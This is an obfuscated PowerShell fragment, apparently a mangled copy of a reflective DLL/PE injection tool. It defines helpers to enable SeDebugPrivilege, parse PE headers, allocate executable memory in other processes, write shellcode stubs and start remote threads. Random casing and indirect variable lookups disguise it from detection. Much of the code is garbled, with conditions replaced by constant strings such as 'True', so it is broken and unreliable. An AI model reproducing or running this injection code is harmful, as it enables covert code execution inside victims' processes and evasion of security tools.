  }
 
 
 
  Function gEt-DelEGatEtype
  {
      Param
      (
          [OutputType([Type])]
 
          [Parameter(positioN = 0)]
          [Type[]]
          ${paRAmETerS} = (&'New-Object' 'Type[]'(0)),
 
          [Parameter(pOSiTION = 1)]
          [Type]
          ${retURnTYPe} = [Void]
    )
 
      ${doMaiN} =  (&('gI')  variaBLE:EGj7).vaLuE::"cURRENtdomaIn"
      ${dYNASSemBLy} = &'New-Object' 'System.Reflection.AssemblyName''ReflectedDelegate'
      ${asSEMBLyBuILder} = ${dOmAIn}."deFinEDYNamICaSSEmBlY"' '
      ${mODuLEBUiLder} = ${aSseMBlYbuilDEr}.'DefineDynamicModule'.Invoke'InMemoryModule False'
      ${tyPebuilDER} = ${moDUleBuildEr}.'DefineType'.Invoke'MyDelegateType Class, Public, Sealed, AnsiClass, AutoClass System.MulticastDelegate'
      ${ConsTRuCTorbuilDER} = ${tYpEbuildEr}.'DefineConstructor'.Invoke'RTSpecialName, HideBySig, Public  '
      ${CONSTRuctoRbUILDer}.'SetImplementationFlags'.Invoke'Runtime, Managed'
      ${MEtHoDBuilDER} = ${TYPeBUiLdER}.'DefineMethod'.Invoke'Invoke Public, HideBySig, NewSlot, Virtual  '
      ${methoDBuildeR}.'SetImplementationFlags'.Invoke'Runtime, Managed'
 
      &'Write-Output' ${tYpEbuIlder}.'CreateType'.Invoke()
  }
 
 
 
  Function GEt-PRoCadDreSS
  {
      Param
      (
          [OutputType'System.IntPtr']
 
          [Parameter(positioN = 0, MAndAtORY = ${tRue})]
          [String]
          ${moDulE},
 
          [Parameter(PoSiTiOn = 1, MANDatOrY = ${TRUE})]
          [String]
          ${PrOcEdURe}
    )
 
 
      ${SYSTeMaSsEmbLy} =   $eGj7::"cuRRENtDOMaIn".'GetAssemblies'.Invoke() |
          &'Where-Object' { ${_}."GLoBalASseMbLYCAChe" -And ${_}."lOCatION".'Split'.Invoke'\'[-1].'Equals'.Invoke'System.dll' }
      ${UNSAFenaTiveMethodS} = ${SysTeMAsseMBLY}.'GetType'.Invoke'Microsoft.Win32.UnsafeNativeMethods'
 
      ${getmODUlehANDlE} = ${uNsAFeNatIVEmeThOds}.'GetMethod'.Invoke'GetModuleHandle'
 
   Try
   {
    ${geTPRocaDDresS} = ${uNSaFeNAtIvEMETHodS}.'GetMethod'.Invoke'GetProcAddress'
   }
   Catch
   {
    ${gETPRocaDDrEss} = ${UNSAfenATIvemEThoDS}.'GetMethod'.Invoke'GetProcAddress Static, Public   System.Object[] '
   }
 
 
      ${KeRn32hanDle} = ${GETmODulEhaNDle}."INVoke"' System.Object[]'
      ${tmppTR} = &'New-Object' 'IntPtr'
      ${hAnDLereF} = &'New-Object' 'System.Runtime.InteropServices.HandleRef'' '
 
 
      &'Write-Output' ${GEtPrOCADdResS}."invoke"(${NuLL}, @([System.Runtime.InteropServices.HandleRef]${HAnDLeREF}, ${procEDuRE}))
  }
 
 
  Function eNABlE-sEdebuGprivIleGE
  {
   Param(
   [Parameter(pOsiTioN = 1, MANdaTOry = ${TRue})]
   [System.Object]
   ${wIN32FUNctIONs},
 
   [Parameter(pOSition = 2, MANDatORy = ${TRue})]
   [System.Object]
   ${WIn32Types},
 
   [Parameter(PosITIOn = 3, mAnDaTOry = ${tRUe})]
   [System.Object]
   ${WiN32ConSTANts}
 )
 
   [IntPtr]${thrEADHANDlE} = ${wiN32fUnCtioNs}."GETCuRrenttHrEad"."iNVoKe"()
   if (${tHrEADHaNDle} -eq   (&'Get-cHiLDITEM' 'VarIable:t2NGf').VaLue::"ZeRO")
   {
    Throw 'Unable to get the handle to the current thread'
   }
 
   [IntPtr]${ThREADTokeN} =  (&'iTEM' vARIAbLe:T2NGF).ValUe::"zeRo"
   [Bool]${resULt} = ${WIn32FUncTionS}."opENtHrEadToKeN"."INVOKE"(${tHreAdHANDlE}, ${wIn32coNsTANTs}."tokEn_qUery" -bor ${WIN32CoNStaNTS}."ToKeN_aDjUST_PrIvilEGES", ${FALse}, [Ref]${ThReaDToKen})
   if (${ResULT} -eq ${FALSe})
   {
    ${ERrORCODe} =  $mlHIT::'GetLastWin32Error'.Invoke()
    if 'True'
    {
     ${reSuLt} = ${WIN32FUNCTiONs}."imPERSoNatesElF"."iNvOkE"'3'
     if (${REsuLT} -eq ${fAlse})
     {
      Throw 'Unable to impersonate self'
     }
 
     ${REsULT} = ${wIn32fuNCTIoNs}."opeNTHreadTokEN"."iNVokE"(${tHrEAdhAndle}, ${win32CoNstANTs}."tOkeN_QUERy" -bor ${wiN32cOnSTANTs}."ToKeN_adjusT_PRIvILEges", ${FalSe}, [Ref]${ThREAdtokEN})
     if (${RESULt} -eq ${faLSe})
     {
      Throw 'Unable to OpenThreadToken.'
     }
    }
    else
    {
     Throw 'Unable to OpenThreadToken. Error code: '
    }
   }
 
   [IntPtr]${PLuID} =   $MlhIT::"ALLochGLoBAl"((&'GeT-vaRIABle'  Mlhit  -VAlueonLY)::"sizeOf"([Type]${WIn32TYPes}."luid"))
   ${rESUlT} = ${Win32FuNCTionS}."LooKUppRivILEGEVAluE"."iNvOkE"' SeDebugPrivilege '
   if (${ResulT} -eq ${fAlse})
   {
    Throw 'Unable to call LookupPrivilegeValue'
   }
 
   [UInt32]${TokENPrIVsIZe} =  (&'VaRIabLE' 'MlhIT').vaLUE::"SIZEoF"([Type]${WiN32TYpEs}."toKen_PRiVILegeS")
   [IntPtr]${TOkeNpRiviLegesmeM} =  (&'GET-vARIAblE'  MLHiT  -va)::'AllocHGlobal'.Invoke(${TokENPriVSIzE})
   ${TokenpRIViLeGEs} =  $mLhit::"PTrTOSTRuCtUrE"' '
   ${TOkeNpriviLEGes}."PRiViLEgecoUNT" = 1
   ${toKeNpriVIlEgEs}."PRIvIlegeS"."Luid" =   (&'Gci' 'VaRIaBLE:Mlhit').valuE::"pTrTosTrUcTURe"' '
   ${TokeNPriviLeGes}."pRivileGES"."ATTRibUtes" = ${win32COnStANtS}."SE_prIVilege_ENaBLED"
     (&'VARIABLe' 'MLHIT').vALUE::'StructureToPtr'.Invoke'  True'
 
   ${reSUlt} = ${WiN32FUNcTiONs}."ADJusTtOKEnpRIviLEgES"."InVOkE"' False    '
   ${eRRorCOde} =   $mLHit::'GetLastWin32Error'.Invoke()
   if 'True'
   {
 
   }
 
    (&'geT-iteM' VArIabLe:mlhIt).vALuE::'FreeHGlobal'.Invoke(${ToKENPRIVIlEgeSMeM})
  }
 
 
  Function cReaTE-ReMotETHreAd
  {
   Param(
   [Parameter(POSiTIOn = 1, mAnDAtoRy = ${tRUe})]
   [IntPtr]
   ${pROCESsHanDLe},
 
   [Parameter(posiTIoN = 2, MANDatOrY = ${TrUe})]
   [IntPtr]
   ${stArTADDRESs},
 
   [Parameter(POSItIOn = 3, ManDATORY = ${FalsE})]
   [IntPtr]
   ${ARGuMENtptr} =  $t2NgF::"ZERo",
 
   [Parameter(PoSITIOn = 4, maNdATORy = ${tRUE})]
   [System.Object]
   ${Win32fUnCtIoNS}
 )
 
   [IntPtr]${REmoTETHREADHaNDlE} =  (&'GCI'  VaRIabLe:t2nGf).VAlUe::"zERo"
 
   ${OSVErsiON} =  (&'item'  VArIABlE:Uryi12).vALue::"OSVErsIon"."vERsIOn"
 
   if ((${oSVErSIOn} -ge (&'New-Object' 'Version' 6,0)) -and 'True')
   {
 
    ${REtVAL}= ${wIN32FuNcTiOns}."NTCrEATETHreAdEx"."iNVOKe"([Ref]${ReMOTeTHReadHANdLE}, 0x1FFFFF,  (&'GeT-ChiLdiTem'  vaRIabLE:T2NgF).vaLue::"zERO", ${PROceSSHaNdLe}, ${STARTadDrESs}, ${aRGUMeNTptr}, ${FALse}, 0, 0xffff, 0xffff,  $T2NGF::"ZeRO")
    ${lAsTerRoR} =   $mlHIT::'GetLastWin32Error'.Invoke()
    if 'True'
    {
     Throw 'Error in NtCreateThreadEx. Return value: . LastError: '
    }
   }
 
   else
   {
 
    ${remoTethREAdHANdle} = ${Win32fUnctiONs}."cREAteREMOTEThREAD"."InVoke"'  65535   0 '
   }
 
   if 'True'
   {
    &'Write-Error' 'Error creating remote thread, thread handle is null' -ErrorAction 'Stop'
   }
 
   return ${rEMOTeTHrEadHaNdlE}
  }
 
 
 
  Function GeT-iMAGEnthEADers
  {
   Param(
   [Parameter(POsItion = 0, MaNDAToRy = ${tRUe})]
   [IntPtr]
   ${peHANdle},
 
   [Parameter(poSITiON = 1, maNDaTOrY = ${TRUe})]
   [System.Object]
   ${wIN32TYpeS}
 )
 
   ${ntheaDeRSINFO} = &'New-Object' 'System.Object'
 
 
   ${DosHeAdEr} =   $mlhIT::"PTRtostRuCTure"' '
 
 
   [IntPtr]${NTHEaDERsPtr} = [IntPtr](&'Add-SignedIntAsUnsigned' ([Int64]${PEHaNdle}) ([Int64][UInt64]${dosHeADER}."E_LfANEW"))
   ${nTheADeRsiNfo} | &'Add-Member' -MemberType 'NoteProperty' -Name 'NtHeadersPtr' -Value ${NtHEADeRspTR}
   ${iMAGENTheAdERS64} =   (&'chiLDiteM' 'vaRIable:mlHiT').vAluE::"PTrtostRUCTURE"' '
 
 
      if 'True'
      {
          throw 'Invalid IMAGE_NT_HEADER signature.'
      }
 
   if (${IMaGENtHEAdeRs64}."OpTIOnaLHEADER"."MAgIc" -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
   {
    ${nthEADeRSInFO} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_NT_HEADERS' -Value ${IMAgENThEADeRS64}
    ${ntheAdErsINFO} | &'Add-Member' -MemberType 'NoteProperty' -Name 'PE64Bit' -Value ${TRUe}
   }
   else
   {
    ${IMAGEnTheaDErS32} =   (&'GeT-vArIAble' 'MlHiT').ValUe::"PTRtOSTRUCtURE"' '
    ${NtHeADeRsiNFo} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_NT_HEADERS' -Value ${ImAgeNthEADErS32}
    ${NtHeAdERsINFo} | &'Add-Member' -MemberType 'NoteProperty' -Name 'PE64Bit' -Value ${fAlSE}
   }
 
   return ${nThEADERSiNFO}
  }
 
 
 
  Function GEt-PEBasiCINFo
  {
   Param(
   [Parameter(pOSItIoN = 0, MandAtoRy = ${TrUE})]
   [Byte[]]
   ${PEBYTes},
 
   [Parameter(PosITion = 1, MaNDAtoRY = ${tRUe})]
   [System.Object]
   ${WIN32TYpeS}
 )
 
   ${PeINFo} = &'New-Object' 'System.Object'
 
 
   [IntPtr]${unMANagedpebYTeS} =  (&'geT-vArIaBlE' MlHiT  -ValUeo)::'AllocHGlobal'.Invoke(${pebYTEs}."LEnGth")
    $MlhiT::'Copy'.Invoke' 0  0' | &'Out-Null'
 
 
   ${NtHeaDeRSiNFo} = &'Get-ImageNtHeaders' -PEHandle ${uNmANAGedPeBYtes} -Win32Types ${WiN32TYPES}
 
 
   ${PeINFo} | &'Add-Member' -MemberType 'NoteProperty' -Name 'PE64Bit' -Value (${ntheAdERsinFO}."PE64Bit")
   ${PeiNfO} | &'Add-Member' -MemberType 'NoteProperty' -Name 'OriginalImageBase' -Value (${nTHEADeRSiNFo}."iMAGE_NT_HEADeRs"."oPtiOnALHEAdEr"."imAgEbaSe")
   ${PEInFo} | &'Add-Member' -MemberType 'NoteProperty' -Name 'SizeOfImage' -Value (${nTheAdersInfO}."IMAGE_NT_HeADeRs"."OptioNAlHeAdeR"."sIzEoFimAGE")
   ${PeiNFO} | &'Add-Member' -MemberType 'NoteProperty' -Name 'SizeOfHeaders' -Value (${NThEaDERsinFO}."ImAGE_Nt_HeaDERs"."oPtIONALHeADer"."SIzEOFHeADeRs")
   ${PeiNFo} | &'Add-Member' -MemberType 'NoteProperty' -Name 'DllCharacteristics' -Value (${NTHeAdERsiNFo}."iMage_nt_HEaDERs"."oPTIONAlHEaDeR"."dLlCHaRaCtErisTICS")
 
 
    $MlHiT::'FreeHGlobal'.Invoke(${UnmaNAgeDpeBYtEs})
 
   return ${pEINfo}
  }
 
 
 
 
  Function Get-PEdetAILEDInFO
  {
   Param(
   [Parameter(poSITiON = 0, maNdAtORy = ${tRUE})]
   [IntPtr]
   ${PEHANdLE},
 
   [Parameter(posITIoN = 1, MandAtory = ${TRuE})]
   [System.Object]
   ${WIN32typES},
 
   [Parameter(PoSITiOn = 2, mAndAToRY = ${tRuE})]
   [System.Object]
   ${Win32consTANTs}
 )
 
   if (${pEHANdlE} -eq ${NULl} -or ${peHANdLE} -eq  $T2Ngf::"zeRO")
   {
    throw 'PEHandle is null or IntPtr.Zero'
   }
 
   ${PeinFo} = &'New-Object' 'System.Object'
 
 
   ${NtHeADeRsINfo} = &'Get-ImageNtHeaders' -PEHandle ${PEHANDle} -Win32Types ${WIN32tYpeS}
 
 
   ${PEinFo} | &'Add-Member' -MemberType 'NoteProperty' -Name 'PEHandle' -Value ${pEhANdlE}
   ${PEiNfo} | &'Add-Member' -MemberType 'NoteProperty' -Name 'IMAGE_NT_HEADERS' -Value (${NtHeadeRSINFO}."iMAGe_NT_HeADeRs")
   ${PEINFo} | &'Add-Member' -MemberType 'NoteProperty' -Name 'NtHeadersPtr' -Value (${NtHEADERSiNFO}."NThEadErSPTR")
   ${PeINFo} | &'Add-Member' -MemberType 'NoteProperty' -Name 'PE64Bit' -Value (${nTHEadeRSinFO}."PE64BiT")
   ${PEInFo} | &'Add-Member' -MemberType 'NoteProperty' -Name 'SizeOfImage' -Value (${NThEAderSiNFo}."iMaGE_NT_HeAdeRS"."OpTionAlHEADEr"."siZeOFImAge")
 
   if (${pEInfO}."pE64BIT" -eq ${tRUE})
   {
    [IntPtr]${SeCTioNHeaDERptR} = [IntPtr](&'Add-SignedIntAsUnsigned' ([Int64]${pEiNFO}."nthEADeRsPTr") ((&'vAriAblE'  MLhiT).VALUe::"siZeOF"([Type]${WIN32typES}."iMAge_Nt_hEAdeRS64")))
    ${peINFO} | &'Add-Member' -MemberType 'NoteProperty' -Name 'SectionHeaderPtr' -Value ${SECtIoNHeAdErpTr}
   }
   else
   {
    [IntPtr]${SECTioNHeADeRPTr} = [IntPtr](&'Add-SignedIntAsUnsigned' ([Int64]${PeinFo}."nTheAdeRSptR") ($MlhIt::"SIZEOF"([Type]${WiN32TYpes}."iMAGE_nt_HeAdERs32")))
    ${peinfo} | &'Add-Member' -MemberType 'NoteProperty' -Name 'SectionHeaderPtr' -Value ${SECTioNhEadeRPtr}
   }
 
   if ((${NtheADErSiNFo}."ImAGe_NT_heAdErs"."FIlEheADeR"."ChArACteRISTIcS" -band ${WiN32CONStaNTS}."iMagE_FIlE_dLl") -eq ${wIn32cONsTaNTS}."IMAGE_fILe_DLL")
   {
    ${PeINFO} | &'Add-Member' -MemberType 'NoteProperty' -Name 'FileType' -Value 'DLL'
   }
   elseif ((${NTheaderSiNfO}."imAGE_nt_HeadeRS"."fILeHeADer"."cHaRACTeRISTics" -band ${WIN32ConsTANTs}."iMaGE_fiLE_eXECUTABLe_IMaGE") -eq ${wIN32consTANTS}."Image_fILE_ExEcUTablE_imAgE")
   {
    ${PEiNfO} | &'Add-Member' -MemberType 'NoteProperty' -Name 'FileType' -Value 'EXE'
   }
   else
   {
    Throw 'PE file is not an EXE or DLL'
   }
 
   return ${peiNFO}
  }
 
 
  Function impOrt-DllInREmOTEPRoCesS
  {
   Param(
   [Parameter(pOsiTiOn=0, manDaTory=${tRue})]
   [IntPtr]
   ${REMOTePROChaNdLE},
 
   [Parameter(poSition=1, MaNdAtoRY=${TRUe})]
   [IntPtr]
   ${ImporTDLLPathPTr}
 )
 
   ${pTrSiZE} =  (&('gi')  ('VARI'+'ab'+'Le:m'+'lHiT')).valUe::"siZeOf"'System.IntPtr'
 
   ${ImPoRTDLLPATh} =   $MlHIt::'PtrToStringAnsi'.Invoke(${ImpORTdllPATHPTR})
   ${DLLPAThSIZe} = [UIntPtr][UInt64]'1'
   ${rIMpORtDLlpATHpTR} = ${win32FuncTIonS}."virtUALAlLOCEx"."INvoKe"(${REmotePRochANDlE},  (&'geT-variaBlE' t2ngF).vALuE::"zeRO", ${dLlPAthsize}, ${wIN32CoNSTANts}."meM_cOMmIT" -bor ${wiN32constANtS}."mEm_RESERVe", ${Win32CONSTANts}."pAGE_rEadWRITE")
   if 'True'
   {
    Throw 'Unable to allocate memory in the remote process'
   }
 
   [UIntPtr]${nUmByTESWRITten} =  $9hRWnY::"zERo"
   ${suCcESS} = ${WIN32FuNctIons}."wriTEpRoCESSmEmoRY"."InVOKe"(${reMotePRocHANdLe}, ${rImpoRtDLlPAThPTR}, ${ImPoRTdllpAThPtr}, ${DLlPaTHsiZe}, [Ref]${NUmByTesWriTTEn})
 
   if (${SuCCeSS} -eq ${FALse})
   {
    Throw 'Unable to write DLL path to remote process memory'
   }
   if (${DllPAthsIzE} -ne ${NumByTeSWRiTtEN})
   {
    Throw 'Didn't write the expected amount of bytes when writing a DLL path to load to the remote process'
   }
 
   ${KerNeL32haNDLE} = ${WIN32FUNCTIONS}."getModuLehaNdLe"."iNVoKe"'kernel32.dll'
   ${LoaDLIBRaRYAaDdR} = ${WIN32FuncTiOnS}."GETPRoCaddrEsS"."invoke"' LoadLibraryA'
 
   [IntPtr]${DllADdreSS} =   (&'DIr' 'vaRIABLe:T2NGF').value::"ZeRo"
 
 
   if (${PEiNFo}."pE64bit" -eq ${TrUE})
   {
 
    ${loaDlIBRARyAReTMem} = ${WIn32fUnctioNs}."vIrTUALALlOCex"."invoKe"(${rEMOTePROCHANdle},   (&'vaRIabLE' 'T2NGf' -vaLU)::"zERO", ${dLlpAThSIZE}, ${wIn32consTANTs}."MEM_coMMIt" -bor ${WIn32coNStanTs}."Mem_resERve", ${WiN32CoNsTanTS}."pAge_ReADwrItE")
    if 'True'
    {
     Throw 'Unable to allocate memory in the remote process for the return value of LoadLibraryA'
    }
 
 
 
    ${LoADLibRARySc1} = @' 83 72 137 227 72 131 236 32 102 131 228 192 72 185'
    ${LoaDLiBRArYSc2} = @' 72 186'
    ${loaDlIBRarYsc3} = @' 255 210 72 186'
    ${loAdLiBRaRYSc4} = @' 72 137 2 72 137 220 91 195'
 
    ${ScLengTh} = ${loADlIbRarySC1}."lENgTH" + ${LOAdlibRaRYsc2}."lENgth" + ${lOADliBRARySC3}."LENgTh" + ${lOADLibRarySC4}."LENgTH" + (${PTRSIzE} * 3)
    ${ScPSMem} =  (&'Get-cHILDIteM' VARIAbLE:MLhIt).valUe::'AllocHGlobal'.Invoke(${ScLENGth})
    ${scPSMemOrigInAL} = ${scPSmEm}
 
    &'Write-BytesToMemory' -Bytes ${loADlIBRArYsc1} -MemoryAddress ${SCpSMem}
    ${sCpsmeM} = &'Add-SignedIntAsUnsigned' ${SCPSMEm} (${LoadLIbRARYSC1}."lENgTh")
     (&'vaRiAbLE' mlHIT).VaLUE::'StructureToPtr'.Invoke'  False'
    ${sCPsMEm} = &'Add-SignedIntAsUnsigned' ${SCpSMEM} (${PTrsIzE})
    &'Write-BytesToMemory' -Bytes ${LoADlIbRarYsC2} -MemoryAddress ${scPSMem}
    ${sCpsMem} = &'Add-SignedIntAsUnsigned' ${scPsMeM} (${lOAdLiBRArYSc2}."LENGTH")
     (&'VARIAbLe'  mLHIt).VALuE::'StructureToPtr'.Invoke'  False'
    ${SCPsmEm} = &'Add-SignedIntAsUnsigned' ${sCpSmEM} (${ptRsIZe})
    &'Write-BytesToMemory' -Bytes ${loAdLIbrArYSc3} -MemoryAddress ${sCpsmEm}
    ${sCpsMEm} = &'Add-SignedIntAsUnsigned' ${SCPSMEm} (${lOAdlIBrArYSC3}."lEngTh")
     (&'GCi'  'vARiaBle:mLhIT').VaLuE::'StructureToPtr'.Invoke'  False'
    ${scpSmEM} = &'Add-SignedIntAsUnsigned' ${SCPSmEM} (${pTRSIze})
    &'Write-BytesToMemory' -Bytes ${LOaDLiBrARYSc4} -MemoryAddress ${SCpsMEm}
    ${ScpsMEm} = &'Add-SignedIntAsUnsigned' ${scpsmeM} (${lOadLiBRaRysC4}."LeNgTh")
 
 
    ${rSCADdr} = ${WiN32Functions}."VIrTUaLALloceX"."InVOkE"(${REMOTEPROCHANdle},   $t2Ngf::"zERo", [UIntPtr][UInt64]${SClengTH}, ${WiN32cOnSTaNTs}."Mem_CoMmiT" -bor ${WIN32ConSTaNts}."Mem_RESERvE", ${wiN32COnSTaNtS}."PAge_exECutE_ReADwritE")
    if (${RScADdr} -eq   $t2Ngf::"ZERo")
    {
     Throw 'Unable to allocate memory in the remote process for shellcode'
    }
 
    ${sUCceSS} = ${wiN32FUNcTIONS}."WRITEproCessmemoRY"."iNVoKE"(${remoTEpRoCHANDLe}, ${rsCaDdr}, ${SCpSmEmoRiGiNAl}, [UIntPtr][UInt64]${sCLenGTH}, [Ref]${nUmByTeSWrITTEN})
    if ((${SUcceSs} -eq ${faLsE}) -or ([UInt64]${NumbYTESwriTteN} -ne [UInt64]${sCLeNgtH}))
    {
     Throw 'Unable to write shellcode to remote process memory.'
    }
 
    ${rThReadHAnDLe} = &'Create-RemoteThread' -ProcessHandle ${REMotEpRoChANDLe} -StartAddress ${RsCAdDR} -Win32Functions ${wIN32fUNCtionS}
    ${ResUlt} = ${wiN32FUncTions}."wAiTFoRSiNGlEOBjecT"."InvOKE"' 20000'
    if 'True'
    {
     Throw 'Call to CreateRemoteThread to call GetProcAddress failed.'
    }
 
 
    [IntPtr]${retURnVaLMem} =   (&'gCi' VARiablE:mLhIt).VaLuE::'AllocHGlobal'.Invoke(${PTRSiZe})
    ${rESuLT} = ${WIN32FUnCTioNs}."reADpROCESSMeMORY"."INVOkE"(${remoTepRocHAnDLE}, ${LOaDLIbraRYaReTmEm}, ${RETURnValMem}, [UIntPtr][UInt64]${pTrSize}, [Ref]${NumbyteSWRItteN})
    if (${ReSUlT} -eq ${FALSE})
    {
     Throw 'Call to ReadProcessMemory failed'
    }
    [IntPtr]${dllADDreSs} =  (&'gEt-VaRiablE' 'MLhiT').valuE::"ptrTostRUCTURE"' System.IntPtr'
 
    ${WIN32FUnctIOnS}."viRtUALFREEeX"."invoKE"'  0 ' | &'Out-Null'
    ${Win32funcTIOnS}."VIRTUAlFReeEx"."invoke"'  0 ' | &'Out-Null'
   }
   else
   {
    [IntPtr]${RtHREaDHAndlE} = &'Create-RemoteThread' -ProcessHandle ${RemoTepRocHandle} -StartAddress ${loAdLIBRArYaaDdR} -ArgumentPtr ${RiMPORTdllpAThpTr} -Win32Functions ${WIN32fUNCTIons}
    ${rESULt} = ${WIN32FUNcTIONS}."WAiTFORsiNgLeOBject"."iNVOKE"' 20000'
    if 'True'
    {
     Throw 'Call to CreateRemoteThread to call GetProcAddress failed.'
    }
 
    [Int32]${eXiTcODE} = 0
    ${rESuLT} = ${win32FUNCtiONs}."GetExiTcOdEThreAD"."InVOKe"(${RThREADHAnDLe}, [Ref]${ExITcOde})
    if ((${RESUlt} -eq 0) -or (${EXiTCoDE} -eq 0))
    {
     Throw 'Call to GetExitCodeThread failed'
    }
 
    [IntPtr]${DLLAddReSS} = [IntPtr]${eXiTcoDE}
   }
 
   ${wIn32fuNctIONS}."VirTUaLfREeEx"."inVOKE"'  0 ' | &'Out-Null'
 
   return ${DLLaDdress}
  }
 
 
  Function get-rEmOTEPROCAdDRESs
  {
   Param(
   [Parameter(PosITIOn=0, maNDatoRY=${trUe})]
   [IntPtr]
   ${ReMOTEPrOchanDLE},
 
   [Parameter(POsITiON=1, MAndatorY=${trUE})]
   [IntPtr]
   ${rEMOTEdLlHanDlE},
 
   [Parameter(PoSITIon=2, mAndAtORY=${TRue})]
   [IntPtr]
   ${FUncTIOnNAMePTR},
 
         [Parameter(pOsition=3, mAnDAtory=${TRUE})]
         [Bool]
         ${LoAdBYOrDinAl}
 )
 
   ${PTRSiZE} =  $MlHIT::"SiZEOf"'System.IntPtr'
 
   [IntPtr]${rfuNCnAmePTR} =  $T2ngF::"ZERo"
 
         if (-not ${lOAdBYORDInAl})
         {
          ${fUNCTionNAMe} =   (&'iTeM' VARiAblE:mLHIt).vAlUe::'PtrToStringAnsi'.Invoke(${FUNCtIOnnAmEPtr})
 
 
       ${fUncTioNNaMeSIZE} = [UIntPtr][UInt64]'1'
       ${rFUNCnamEptR} = ${wIN32FUNcTiOns}."vIRtUAlALLoCEX"."INvOke"(${ReMOTePROchanDLe},   (&'iTem' 'VArIaBLe:T2NgF').vALuE::"ZeRo", ${fUNctiOnnamEsIZE}, ${WiN32COnSTaNtS}."MEm_coMMIt" -bor ${Win32CONSTANTS}."meM_reSeRVe", ${WIN32cOnsTAnTS}."PAgE_rEADwriTE")
       if 'True'
       {
        Throw 'Unable to allocate memory in the remote process'
       }
 
       [UIntPtr]${nUmBYTeSWriTTEN} =  (&'vaRIabLE'  '9HRwNy' -vaLUEo)::"ZeRo"
       ${SuCcEsS} = ${WIN32FuNcTIoNS}."WRITEPRocEssMemoRY"."iNvOKE"(${REMotePROCHANDlE}, ${RFUncNaMepTr}, ${FuncTIoNNAmEPTR}, ${FUnCTioNnAMeSIZe}, [Ref]${NuMBYTESWritTen})
       if (${sUcCESS} -eq ${FAlSe})
       {
        Throw 'Unable to write DLL path to remote process memory'
       }
       if (${fUncTIOnNameSiZe} -ne ${numbyTesWRITtEn})
       {
        Throw 'Didn't write the expected amount of bytes when writing a DLL path to load to the remote process'
       }
         }
 
         else
         {
             ${rFUNCNaMepTR} = ${FUNCTIoNNAMEPtR}
         }
 
 
   ${kERnEL32hANdLE} = ${wIN32FUNCTioNS}."GeTmOdUlEhAndlE"."INvOKE"'kernel32.dll'
   ${GETpRocadDresSADdR} = ${wIN32FUnCtioNs}."getPROCaDDrEss"."INVokE"' GetProcAddress'
 
 
 
   ${GETPROcaDdReSsReTMeM} = ${Win32FuNctIoNs}."ViRTUAlALLoCex"."InVOKe"(${REMoTEPRochanDle},  (&'gcI'  VAriable:t2ngF).valUE::"ZeRo", [UInt64][UInt64]${pTRsIze}, ${WiN32cOnsTaNtS}."meM_comMit" -bor ${win32cOnStaNts}."MeM_ReSeRvE", ${WiN32CoNSTAnTS}."PAgE_READWRITE")
   if 'True'
   {
    Throw 'Unable to allocate memory in the remote process for the return value of GetProcAddress'
   }
 
 
 
 
   [Byte[]]${GETPROCaDDRESssc} = @()
   if (${peINfo}."pe64BiT" -eq ${TRUE})
   {
    ${GeTpROCAddrESsSC1} = @' 83 72 137 227 72 131 236 32 102 131 228 192 72 185'
    ${geTpRoCADdResSSc2} = @' 72 186'
    ${gEtpRoCAdDRESssC3} = @' 72 184'
    ${gETPrOCAddreSssC4} = @' 255 208 72 185'
    ${gEtpRocAddREsSSc5} = @' 72 137 1 72 137 220 91 195'
   }
   else
   {
    ${GETPRocaDdRessSc1} = @' 83 137 227 131 228 192 184'
    ${GetPROCaDdREsSsC2} = @' 185'
    ${GEtpRoCaddresSSC3} = @' 81 80 184'
    ${geTPRoCAddrESSsc4} = @' 255 208 185'
    ${gEtPRoCAddreSsSc5} = @' 137 1 137 220 91 195'
   }
   ${sCLengTh} = ${geTprocADdReSSsc1}."lENgTh" + ${GETprocaddREsSsc2}."LenGTh" + ${gETpRoCAdDREsssC3}."leNgTh" + ${GeTPRocaDDRESSSc4}."leNGTh" + ${GETPROCADdrEsssC5}."leNgTh" + (${PtRsiZe} * 4)
   ${SCPSmeM} =   $mlhIt::'AllocHGlobal'.Invoke(${sclEnGTH})
   ${ScPSMEMoRigiNal} = ${ScPsMem}
 
   &'Write-BytesToMemory' -Bytes ${geTpROcadDReSSsc1} -MemoryAddress ${SCPSMEM}
   ${SCpsMem} = &'Add-SignedIntAsUnsigned' ${sCPsmem} (${gETpRoCadDRESsSC1}."lEngTh")
     $mlhIT::'StructureToPtr'.Invoke'  False'
   ${sCpsmeM} = &'Add-SignedIntAsUnsigned' ${scPSMem} (${PTRSiZe})
   &'Write-BytesToMemory' -Bytes ${GetpRocADdReSssC2} -MemoryAddress ${scpSMEM}
   ${ScPSmEM} = &'Add-SignedIntAsUnsigned' ${sCpsmeM} (${gEtPROCAdDREsSSC2}."lEnGTH")
    $mLhIT::'StructureToPtr'.Invoke'  False'
   ${SCPsMEM} = &'Add-SignedIntAsUnsigned' ${scpSmem} (${PTRsIZE})
   &'Write-BytesToMemory' -Bytes ${GEtPrOcAdDresssc3} -MemoryAddress ${sCpsmem}
   ${ScpsMEm} = &'Add-SignedIntAsUnsigned' ${SCpsmeM} (${GetproCADDresSSC3}."leNGTH")
     (&'iTem'  varIabLe:mLHIt).VaLuE::'StructureToPtr'.Invoke'  False'
   ${sCpSmEM} = &'Add-SignedIntAsUnsigned' ${sCPSMEM} (${pTRsIZE})
   &'Write-BytesToMemory' -Bytes ${gEtpRocadDreSSsC4} -MemoryAddress ${SCpsmEm}
   ${SCpSmEM} = &'Add-SignedIntAsUnsigned' ${SCpSMEM} (${GETProCadDrEssSC4}."leNGth")
     $mLHIT::'StructureToPtr'.Invoke'  False'
   ${SCPSmEm} = &'Add-SignedIntAsUnsigned' ${scPSMEm} (${PTRSizE})
   &'Write-BytesToMemory' -Bytes ${gEtpROcAdDResSsC5} -MemoryAddress ${scpSmem}
   ${scpsmEM} = &'Add-SignedIntAsUnsigned' ${sCpsMEM} (${GETpRoCAdDrESSsC5}."LENgth")
 
   ${rsCaDdr} = ${WIN32FunctiONs}."VIRtUALAllOCex"."INvoke"(${rEmotepROCHAnDle},  $T2nGf::"zERO", [UIntPtr][UInt64]${sCleNgTH}, ${wiN32coNSTAnTs}."MEm_cOmmiT" -bor ${WIN32coNSTAnTs}."Mem_REseRvE", ${WiN32CONstANTS}."PAGE_ExecUtE_reAdwRItE")
   if (${RSCaddr} -eq   $t2ngf::"zERo")
   {
    Throw 'Unable to allocate memory in the remote process for shellcode'
   }
